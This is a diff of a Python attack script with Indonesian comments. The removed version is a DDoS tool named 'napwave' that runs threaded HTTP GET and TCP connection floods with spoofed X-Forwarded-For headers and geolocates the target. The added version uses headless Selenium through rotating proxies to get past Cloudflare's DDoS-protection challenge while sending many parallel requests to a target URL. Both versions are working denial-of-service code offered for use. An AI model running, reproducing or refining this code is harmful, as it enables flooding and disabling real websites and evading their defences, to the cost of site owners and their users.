@@ -1,146 +1,93 @@
-#!/usr/bin/env python3
-
-import threading
-import socket
-import argparse
-import logging
-import random
 import time
-import signal
-import requests
-from colorama import init, Fore, Style
+import threading
+import random
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
 
-# Inisialisasi colorama untuk warna teks di terminal
-init(autoreset=True)
+# Daftar proxy dari file teks
+with open('proxy.txt') as f:
+    proxies = f.read().splitlines()
 
-# Pengaturan logging
-logging.basicConfig(level=logging.INFO, format=f"{Fore.WHITE}%(asctime)s{Style.RESET_ALL} - %(levelname)s - %(message)s")
+# Mengatur agen yang akan digunakan
+user_agent = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
 
-connection_counter = 0
-lock = threading.Lock()
-terminate = False
+#Meminta Url target
+target_url = "https://example.co.il"
 
-# Daftar IP palsu
-fake_ips = ['192.168.1.1', '192.168.1.2', '192.168.1.3', '192.168.1.4']
+# Mengatur jumlah kiriman per second
+requests_per_second = 50
 
-def signal_handler(sig, frame):
-    global terminate
-    if terminate:
-        print(f"{Fore.RED}Menghentikan program secara paksa...{Style.RESET_ALL}")
-        exit(0)
-    print(f"{Fore.CYAN}Selesai.{Style.RESET_ALL}")
-    terminate = True
+# Mengatur jumlah detik untuk menjalankan skrip
+run_time_seconds = 60
 
-signal.signal(signal.SIGINT, signal_handler)
+# Mengatur jumlah thread yang akan digunakan
+num_threads = 70
 
-# Fungsi untuk mendapatkan geolokasi target menggunakan ip-api.com
-def get_geolocation(ip_address):
-    try:
-        response = requests.get(f"http://ip-api.com/json/{ip_address}")
-        data = response.json()
-        if data['status'] == 'success':
-            print(f"{Fore.LIGHTBLACK_EX}Geolokasi Target:{Style.RESET_ALL}")
-            print(f"{Fore.LIGHTBLACK_EX}IP:{Style.RESET_ALL} {data['query']}")
-            print(f"{Fore.LIGHTBLACK_EX}Negara:{Style.RESET_ALL} {data['country']}")
-            print(f"{Fore.LIGHTBLACK_EX}Kota:{Style.RESET_ALL} {data['city']}")
-            print(f"{Fore.LIGHTBLACK_EX}ISP:{Style.RESET_ALL} {data['isp']}")
-            print(f"{Fore.LIGHTBLACK_EX}Zona Waktu:{Style.RESET_ALL} {data['timezone']}")
-        else:
-            print(f"{Fore.RED}Gagal mendapatkan geolokasi untuk IP {ip_address}{Style.RESET_ALL}")
-    except requests.RequestException as e:
-        print(f"{Fore.RED}Error saat mengakses API geolokasi: {e}{Style.RESET_ALL}")
+# Define a function to send requests with Selenium and bypass Cloudflare
+def send_request(proxy):
+    # Create a ChromeDriver instance with Selenium
+    chrome_options = Options()
+    chrome_options.add_argument('--disable-extensions')
+    chrome_options.add_argument('--headless')
+    chrome_options.add_argument('--disable-gpu')
+    chrome_options.add_argument('--no-sandbox')
+    chrome_options.add_argument('--disable-dev-shm-usage')
+    chrome_options.add_argument(f'user-agent={user_agent}')
+    chrome_options.add_argument('--proxy-server=%s' % proxy)
+    driver = webdriver.Chrome(options=chrome_options)
 
-class Ddos(threading.Thread):
-    def __init__(self, target_ip, http_port, fake_ip):
-        super().__init__()
-        self.target_ip = target_ip
-        self.http_port = http_port
-        self.fake_ip = fake_ip
+    # Send the request to the target URL
+    driver.get(target_url)
 
-    def bypass(self):
-        return random.choice(fake_ips)
+    # Check if the page is protected by Cloudflare
+    if "DDoS protection by Cloudflare" in driver.title:
+        # Wait for the JavaScript challenge page to appear
+        wait = WebDriverWait(driver, 30)
+        wait.until(EC.presence_of_element_located((By.ID, "challenge-form")))
 
-    def ddos(self):
-        global connection_counter
-        while not terminate:
-            try:
-                # Layer 7 HTTP GET Flood
-                new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                new_socket.settimeout(0.5)
-                new_socket.connect((self.target_ip, self.http_port))
+        # Solve the challenge by waiting for a random amount of time
+        time.sleep(random.uniform(2, 5))
 
-                headers = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\n"
-                headers += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n"
-                headers += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n"
-                headers += "Accept-Encoding: gzip, deflate\r\n"
-                headers += f"X-Forwarded-For: {self.bypass()}\r\n"
-                headers += "Connection: keep-alive\r\n\r\n"
+        # Submit the challenge form
+        form = driver.find_element_by_id("challenge-form")
+        form.submit()
 
-                new_socket.sendall(headers.encode('ascii'))
-                new_socket.close()
+        # Wait until the "challenge-running" element disappears
+        wait.until_not(EC.presence_of_element_located((By.ID, "challenge-running")))
 
-                with lock:
-                    connection_counter += 1
-                    if connection_counter % 500 == 0:
-                        logging.info(f"{Fore.CYAN}Total koneksi (HTTP GET Flood): {connection_counter}{Style.RESET_ALL}")
+    # Get the page source and quit the ChromeDriver instance
+    page_source = driver.page_source
+    driver.quit()
 
-                time.sleep(random.uniform(0.1, 0.5))
+    return page_source
 
-            except socket.error:
-                logging.error(f"{Fore.RED}Koneksi HTTP GET gagal ke {self.target_ip}:{self.http_port}{Style.RESET_ALL}")
+# Define a function to send multiple requests per second with a random proxy
+def send_requests():
+    while True:
+        proxy = random.choice(proxies)
+        try:
+            page_source = send_request(proxy)
+            print("Success with proxy:", proxy)
+            break
+        except:
+            print("Failed with proxy:", proxy)
 
-    def tcp_flood(self):
-        global connection_counter
-        while not terminate:
-            try:
-                # Layer 4 TCP SYN Flood
-                new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                new_socket.connect((self.target_ip, self.http_port))
-                new_socket.close()
+    # Wait for a random amount of time before sending the next request
+    time.sleep(random.uniform(1/requests_per_second, 1/(2*requests_per_second)))
 
-                with lock:
-                    connection_counter += 1
-                    if connection_counter % 500 == 0:
-                        logging.info(f"{Fore.MAGENTA}Total koneksi (TCP SYN Flood): {connection_counter}{Style.RESET_ALL}")
+# Start the loop to send requests
+start_time = time.time()
+threads = []
+for i in range(num_threads):
+    thread = threading.Thread(target=send_requests)
+    thread.start()
+    threads.append(thread)
+for thread in threads:
+    thread.join()
+while time.time() - start_time < run_time_seconds:
+    send_requests()
 
-                time.sleep(random.uniform(0.1, 0.5))
-
-            except socket.error:
-                logging.error(f"{Fore.RED}Koneksi TCP gagal ke {self.target_ip}:{self.http_port}{Style.RESET_ALL}")
-
-    def hybrid_attack(self):
-        """ Hybrid method that randomly switches between HTTP GET and TCP SYN flood """
-        if random.choice([True, False]):
-            self.ddos()
-        else:
-            self.tcp_flood()
-
-    def run(self):
-        while not terminate:
-            self.hybrid_attack()
-
-def main():
-    parser = argparse.ArgumentParser(description=f"{Fore.CYAN}napwave the DDos attack{Style.RESET_ALL}", formatter_class=argparse.RawTextHelpFormatter)
-    parser.add_argument("-IP", "--target_ip", type=str, required=True, help="IP target")
-    parser.add_argument("-p", "--http_port", type=int, required=True, help="Port target")
-    parser.add_argument("-F", "--fake_ip", type=str, required=True, help="IP palsu")
-    parser.add_argument("-t", "--num_threads", type=int, required=True, help="Jumlah thread")
-
-    args = parser.parse_args()
-
-    print(f"{Fore.CYAN}napwave attack...{Style.RESET_ALL}")
-
-    # Panggil fungsi geolokasi untuk menampilkan info target
-    get_geolocation(args.target_ip)
-
-    threads = []
-    for _ in range(args.num_threads):
-        thread = Ddos(args.target_ip, args.http_port, args.fake_ip)
-        thread.start()
-        threads.append(thread)
-
-    for thread in threads:
-        thread.join()
-
-if __name__ == "__main__":
-    main()
+print("Done sending requests.")
